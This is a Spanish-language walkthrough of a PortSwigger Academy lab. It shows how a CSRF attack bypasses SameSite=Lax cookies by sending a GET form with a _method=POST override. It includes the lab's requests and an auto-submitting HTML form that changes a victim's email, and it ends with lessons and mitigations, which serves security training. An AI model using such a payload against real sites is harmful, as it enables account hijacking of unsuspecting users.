---
title: "SameSite Lax bypass via method override"
platform: "PortSwigger"
os: "Windows"
difficulty: "Insane"
ip: "10.10.10.XXX"
slug: "samesite-lax-bypass-via-method-override"
author: "Z4k7"
date: "2026-04-05"
year: "2026"
status: "pwned"
tags:
  - "SameSite"
  - "Lax"
  - "CSRF"
techniques:
  - "SameSite Lax Bypass"
  - "Method Override"
  - "GET to POST"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque CSRF contra SameSite Lax usando method override. La aplicación aplica automáticamente SameSite=Lax (por defecto en Chrome cuando no se especifica). SameSite Lax permite envío de cookies en solicitudes GET (navegaciones de nivel superior), pero NO en POST. Sin embargo, si el servidor soporta _method override, se puede enviar una solicitud GET que el servidor interpreta como POST. El navegador envía la cookie (porque es GET), y el servidor la procesa como POST. Demuestra por qué method override es peligroso con SameSite Lax.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Para resolver el laboratorio, realiza un ataque CSRF que modifique la dirección de correo electrónico de la víctima. Debes utilizar el servidor de explotación proporcionado para alojar tu ataque.
          Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: `wiener:peter`
      - kind: "callout"
        type: "info"
        label: "Nota sobre SameSite"
        text: "Las restricciones predeterminadas de SameSite varían según el navegador. Dado que la víctima usa Chrome, recomendamos usar también Chrome (o el navegador Chromium integrado de Burp) para probar el exploit."
      - kind: "callout"
        type: "info"
        label: "Pista"
        text: "No puedes registrar una dirección de correo electrónico que ya esté en uso por otro usuario. Si cambias tu dirección de correo electrónico mientras pruebas tu exploit, asegúrate de usar una dirección diferente para el exploit final que le envíes a la víctima."

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405114118787.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ingresamos en el apartado de login:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405114156931.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El usuario y password están disponibles en el objetivo del laboratorio:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405114240496.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Acceso a URL del laboratorio exitoso"
      - kind: "bullet"
        text: "Credenciales válidas: wiener:peter"
      - kind: "bullet"
        text: "Usuario autenticado con sesión activa"
      - kind: "bullet"
        text: "Acceso a sección de cambio de email"
      - kind: "note"
        text: |
          Consultamos el código fuente del apartado de cambio del email:
      - kind: "code"
        lang: "HTML"
        code: |
          <div id="account-content">
              <p>Your username is: wiener</p>
              <p>Your email is: <span id="user-email">wiener@normal-user.net</span></p>
              <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                  <label>Email</label>
                  <input required="" type="email" name="email" value="">
                  <button class="button" type="submit"> Update email </button>
              </form>
          </div>
      - kind: "note"
        text: |
          En el código anterior no evidenciamos un token de seguridad para CSRF. El formulario espera POST, pero ¿qué sucede si usamos GET?
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab combina DOS conceptos que ya conoces: 1. SameSite Lax — permite GET cross-site 2. Method Override — permite usar GET como POST  El servidor confía en que GET es 'seguro' porque SameSite lo permite. PERO si el parámetro `_method=POST` hace que se procese como POST, entonces SameSite Lax es bypasseado."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Se emula el proceso de cambio de correo electrónico para analizar las cabeceras:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405114747528.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Código de la solicitud del cambio de email:
      - kind: "code"
        lang: "JS"
        code: |
          POST /my-account/change-email HTTP/2
          Host: 0a3b00590464312480bfadbf00ad00c0.web-security-academy.net
          Cookie: session=gU4YWVo4tQaPgcyKlmMMsTfvxBEVZoB4
          Content-Length: 22
          ...
          
          email=hack%40gmail.com
      - kind: "note"
        text: |
          En el análisis realizado con BurpSuite, al acceder al directorio `/login` se observan las siguientes cabeceras de respuesta:
      - kind: "code"
        lang: "JS"
        code: |
          HTTP/2 302 Found
          Location: /my-account?id=wiener
          Set-Cookie: session=LmKSCCQZuRRvNBkGsSPG8LvFqbr7VTFf; Expires=Mon, 06 Apr 2026 17:56:22 UTC; Secure; HttpOnly
          X-Frame-Options: SAMEORIGIN
          Content-Length: 0
      - kind: "note"
        text: |
          Hallazgo crítico: La cookie NO especifica `SameSite`. Esto significa que Chrome aplica automáticamente `SameSite=Lax`.
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405130053056.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si enviamos una solicitud de cambio de correo electrónico por medio de POST, nos permite realizar el cambio sin problema.
      - kind: "callout"
        type: "warning"
        label: "SameSite=Lax por Defecto"
        text: "Si el sitio web no establece explícitamente un atributo `SameSite`, Chrome aplica automáticamente `Lax`. Esto significa que la cookie solo se envía en solicitudes entre sitios que cumplen con criterios específicos: - La solicitud utiliza el método GET - La solicitud proviene de una navegación de nivel superior iniciada por el usuario (clic en enlace)  Las solicitudes POST cross-site NO incluyen la cookie bajo SameSite=Lax."
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405171307665.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si intentamos enviar la solicitud por medio de GET, el sistema rechaza:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405173731929.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El endpoint `/my-account/change-email` espera POST para procesar cambios. GET es rechazado.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El problema: SameSite Lax confía en GET. El servidor confía en POST. Pero ¿qué si podemos decirle al servidor que un GET es POST? Ahí entra `_method` override."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El bypass combina dos conceptos:
          1. SameSite Lax permite GET cross-site — el navegador envía cookies
          2. Method override permite GET ser tratado como POST — el servidor lo procesa
          Primer intento — CSRF POST directo (falla):
      - kind: "code"
        lang: "HTML"
        code: |
          <form action="https://0a3b00590464312480bfadbf00ad00c0.web-security-academy.net/my-account/change-email" method="POST">
              <input type="hidden" name="email" value="hacker@htm.com">
          </form>
          <script> 
              document.forms[0].submit(); 
          </script>
      - kind: "note"
        text: |
          SameSite Lax rechaza POST cross-site. Sin cookie → no funciona.
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405173526368.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Segundo intento — GET directo (falla):
      - kind: "code"
        lang: "JS"
        code: |
          GET /my-account/change-email?email=hack%40gmail.com
      - kind: "note"
        text: |
          El servidor rechaza GET porque espera POST.
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405173731929.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tercer intento — GET con method override (FUNCIONA):
      - kind: "code"
        lang: "HTML"
        code: |
          <form action="https://0a3b00590464312480bfadbf00ad00c0.web-security-academy.net/my-account/change-email" method="GET">
              <input type="hidden" name="email" value="hacker@htm.com">
              <input type="hidden" name="_method" value="POST">
          </form>
          <script> 
              document.forms[0].submit(); 
          </script>
      - kind: "note"
        text: |
          Desglose del ataque:
          1. Formulario con method=GET:
          - El navegador envía como GET (no POST)
          - SameSite Lax: "es GET" → envía cookies ✓
          2. Parámetro `_method=POST`:
          - El servidor recibe: `GET /my-account/change-email?email=...&_method=POST`
          - Interpreta el parámetro `_method`
          - Procesa como si fuera POST ✓
          3. Resultado:
          - Navegador envía cookies (porque es GET y SameSite Lax lo permite)
          - Servidor procesa como POST (porque `_method=POST`)
          - Email cambiado ✅
          Ingresamos en el apartado de `Go to Exploit Server` para simular un servidor atacante:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405174120358.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se guarda el payload y se envía a la víctima:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405174350882.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20method%20override/file-20260405174407493.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Anatomía del Bypass — SameSite Lax + Method Override"
        text: "1. Navegador crea GET cross-site 2. SameSite Lax: 'es GET' → envía cookies 3. Servidor recibe: GET + parámetro `_method=POST` 4. Interpreta como POST 5. Procesa cambio de email 6. Email cambiado ✅  El bypass funciona porque: - SameSite Lax confía en GET (es navegación de nivel superior) - Method override permite cambiar semántica de la solicitud - Servidor nunca valida si el cambio debería ser solo POST"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass es INTELIGENTE porque no rompe SameSite. Lo COMBINA con otra vulnerabilidad (method override). El atacante dice: 'voy a usarLE SameSite Lax contra ti — enviaré GET, que SameSite permite, pero lo haré parecer POST'."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          No hay "acceso inicial" en este lab. Solo cambio de email de víctima.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab cierra un ciclo importante: SameSite Lax confía en navegación 'de nivel superior' (GET). Pero si el servidor no valida el MÉTODO HTTP correctamente (acepta GET como POST), esa confianza se rompe. La lección: validar el método HTTP es importante incluso con SameSite."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica a este lab.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este pattern (GET → POST via override) aparece en muchos frameworks legítimos (Rails, Laravel, etc.). El problema es cuando se combina con defensas débiles como 'solo SameSite Lax'."

lessons:
  - 'SameSite Lax confía en GET: Porque GET (navegación nivel superior) es "iniciado por usuario".'
  - 'Method override puede ser peligroso: Si el servidor lo usa, permite cambiar semántica de solicitud.'
  - 'GET no debería modificar estado: Pero si el servidor lo permite vía `_method`, entonces sí.'
  - 'SameSite Lax es mejor que None, pero NO es suficiente: Requiere validación correcta del método HTTP.'
  - 'Defensa en profundidad es crítica: SameSite + validación de método + CSRF tokens = seguro.'
  - 'El navegador confía en GET: El atacante abusa de esa confianza.'
mitigation:
  - 'No usar method override en operaciones sensibles: O restringirlo severamente.'
  - 'Validar que POST siempre use POST: No permitir GET como sustituto.'
  - 'Usar SameSite=Strict en cookies críticas: Si es posible (aunque rompe algunos flujos).'
  - 'Incluir CSRF tokens incluso con SameSite: Defensa en profundidad.'
  - 'Validar origen y referencia HTTP: Además de SameSite.'
  - 'Loguear cambios sensibles: Para detectar patrones anómalos.'
---
